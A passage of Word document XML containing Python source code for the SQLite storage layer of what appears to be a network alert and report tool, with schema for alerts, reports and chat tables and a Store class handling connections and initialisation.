          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    probe_id    TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A362B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flow_key    TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493E73B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    category    TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FC1026">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    confidence  REAL    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B98E11D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    risk        TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="463B4A0D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    features    TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD921C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    evidence    TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D32CBBF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    status      TEXT    NOT NULL DEFAULT 'open',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD6698B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    source      TEXT    NOT NULL DEFAULT 'model',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5F26A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rule        TEXT,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614EADBC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    proba       TEXT,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA5F526">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    created_at  REAL    NOT NULL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DCDA08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C85719">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CREATE INDEX IF NOT EXISTS idx_alerts_time ON alerts(created_at);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AC2B9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CREATE INDEX IF NOT EXISTS idx_alerts_category ON alerts(category);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538B127D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="611FDBFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CREATE TABLE IF NOT EXISTS reports (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7382AEC0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    id          INTEGER PRIMARY KEY AUTOINCREMENT,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CFC21F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alert_id    INTEGER NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A8C005">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    content     TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6DF5CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model       TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D4EE94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    elapsed_ms  INTEGER NOT NULL DEFAULT 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264DB210">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    created_at  REAL    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB52622">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    FOREIGN KEY (alert_id) REFERENCES alerts(id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31698196">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45EE7625">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15CB6E6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CREATE TABLE IF NOT EXISTS chat (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B284A81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    id          INTEGER PRIMARY KEY AUTOINCREMENT,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB27D6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    report_id   INTEGER NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B5219A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    role        TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3886993E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    content     TEXT    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C52D1FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    created_at  REAL    NOT NULL,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC50A30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    FOREIGN KEY (report_id) REFERENCES reports(id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6328B93B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="294F563E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000DE3C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="177EC8E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="186C5ADE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class Store:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="032F47F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, path: str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2310DC6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.path = Path(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A14AF96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.path.parent.mkdir(parents=True, exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B95D25">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.init()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FF5C0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E4D70C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @contextmanager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9417B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def connect(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A64AD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        conn = sqlite3.connect(self.path, timeout=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090FD7DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        conn.row_factory = sqlite3.Row</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9D6866">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32979CA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            yield conn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43765A80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            conn.commit()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3657355D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22868469">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            conn.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DDB647">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35007AFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def init(self) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A91DD2A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3391A260">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            conn.executescript(SCHEMA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C1CFD6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self._migrate(conn)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F7B4C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F40F794">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @staticmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F158D04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def _migrate(conn) -&gt; None:</w:t>
      </w:r>
    </w:p>
